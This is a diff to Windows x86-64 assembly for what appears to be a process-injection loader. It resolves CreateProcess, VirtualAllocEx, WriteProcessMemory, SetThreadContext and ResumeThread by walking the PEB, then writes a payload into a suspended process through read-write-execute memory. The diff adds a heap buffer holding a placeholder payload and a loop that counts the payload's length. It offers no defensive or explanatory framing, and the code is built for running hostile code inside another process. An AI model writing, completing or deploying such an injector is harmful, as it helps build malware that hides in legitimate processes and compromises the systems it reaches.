@@ -11,7 +11,10 @@ global main
 
 section .text
 main:
-	sub rsp, 0x508			;not sure why I have to add 0x28. Seems counter-intuitive as the stack should be 0x10 aligned.
+	;Giving myself more stack space than this leads to access violations down the line.
+	;If someone knows a way around this while maintaining a minimalist approach by avoiding
+	;the heap, let me know.
+	sub rsp, 0x508
 	
 	;Get the PEB at gs:[0x60]
 	mov rax, gs:[0x60]		;PEB location.
@@ -160,6 +163,9 @@ contn:
 	mov rax, [rsp + 0x190]
 	test rax, rax
 	jz initOT
+	mov rax, [rsp + 0x198]
+	test rax, rax
+	jz initVAnoEX
 
 initProcA:
 	mov qword rax, rsi
@@ -211,6 +217,12 @@ initOT:
 	xor rdx, rdx
 	mov qword rax, rsi
 	mov [rsp + 0x190], rax			;OpenThread on the stack via pointer.
+	jmp FindVAnoEX
+
+initVAnoEX:
+	xor rdx, rdx
+	mov qword rax, rsi
+	mov [rsp + 0x198], rax
 	jmp CrtPrc
 
 FindCrtP:
@@ -283,7 +295,7 @@ FindEP:
 	xor rdx, rdx
 	jmp keepCount
 
-	;Find VirtualAlloc.
+	;Find VirtualAllocEx.
 FindVA:
 	mov eax, 0x74726956 
 	mov [rsp + 0x100], rax
@@ -356,6 +368,17 @@ FindOT:
 	xor rax, rax
 	jmp keepCount
 
+	;Find VirtualAlloc.
+FindVAnoEX:
+	mov eax, 0x74726956 
+	mov [rsp + 0x100], rax
+	mov eax, 0x416c6175 
+	mov [rsp + 0x104], rax
+	mov eax, 0x636f6c6c
+	mov [rsp + 0x108], rax
+	xor rax, rax
+	jmp keepCount
+
 
 	;Call CreateProcess WinAPI with arguments.
 CrtPrc:
@@ -423,6 +446,7 @@ CrtPrc:
 	;[rsp + 0x180]			SetThreadContext on the stack via pointer.
 	;[rsp + 0x188]			ResumeThread on the stack via pointer.
 	;[rsp + 0x190]			OpenThread on the stack via pointer.
+	;[rsp + 0x198]			VirtualAlloc on the stack via pointer.
 	;[rsp + 0x26c]			PROCESS_INFORMATION struct for suspended process.
 
 	;LPVOID VirtualAllocEx(
@@ -454,15 +478,40 @@ CrtPrc:
 	;  [in]  SIZE_T  nSize,
 	;  [out] SIZE_T  *lpNumberOfBytesWritten
 	;);
-	;######### MAY NEED TO GET HEAP FOR PAYLOAD! ABI GIVING ME BULLSHIT WITH TOOMUCH STACK!!!#####
+
+	;Need to get Heap address for payload pointer. Having issues with giving myself too much stack space at the top of .text.
+	;Anyone know a work around so I don't need to use the heap?
+	xor rcx, rcx
+	mov qword rdx, 0x1000
+	mov r8d, 0x3000
+	mov r9d, 0x40
+	mov qword rax, [rsp + 0x198]
+	call rax
+	mov qword [rsp + 0x2f0], rax			;Heap payload pointer stored on the stack.
+	mov qword [rax], 0x41414141			;Start moving the payload in the heap here.
+	
+	;Initialize the counter.
+	xor rdx, rdx
+	mov qword rcx, rax
+	
+	;Count bytes in the payload.
+CountPL:
+	mov rax, [rcx]
+	test rax, rax
+	jz WProc				;1 means data exists.
+	add rcx, 0x08
+	inc rdx
+	jmp CountPL
+
+	;Setup args for WriteProcessMemory.
+WProc:
 	lea qword rax, [rsp + 0x26c]
 	mov qword rcx, [rax]
 	mov qword rax, [rsp + 0x2f8]
+	mov qword r9, rdx			;Counter from RDX times 8 to get total in bytes.
+	shl r9, 3
 	mov rdx, rax
-	mov qword [rsp + 0x2f0], 0x41414141	;MAY NEED TO USE HEAP INSTEAD OF STACK!!!!
-	lea qword r8, [rsp + 0x2f0]
-CountPL:
-	mov r9, 0x08					;seperate instruction for counting the payload length. Do this!
+	mov qword r8, [rsp + 0x2f0]
 	lea qword rax, [rsp + 0x300]
 	mov qword [rsp + 0x20], rax
 	mov qword rax, [rsp + 0x170]
